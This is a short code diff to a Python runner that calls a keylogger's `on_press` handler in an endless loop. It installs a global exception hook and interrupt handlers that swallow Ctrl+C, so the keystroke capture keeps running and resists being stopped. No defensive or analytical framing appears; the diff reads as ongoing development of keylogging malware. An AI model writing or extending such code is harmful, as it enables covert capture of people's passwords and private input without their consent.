@@ -12,9 +12,8 @@ def _suppress_keyboard_interrupt(exctype, value, tb):
 sys.excepthook = _suppress_keyboard_interrupt
 
 
-def run_forever(INPUT):
+def run_forever(INPUT : str):
 
-    INPUT = "background_runner.py"
     while True:
         try:
             keylogger.on_press(INPUT)
@@ -24,11 +23,11 @@ def run_forever(INPUT):
             try:
                 time.sleep(0.1)
             except KeyboardInterrupt:
-                pass
+                _suppress_keyboard_interrupt(None, None, None)
             continue
         except Exception as e:
             print(f"error occurred {e}", file=sys.stderr, flush=True)
             try:
                 time.sleep(1)
             except KeyboardInterrupt:
-                pass
+                _suppress_keyboard_interrupt(None, None, None)
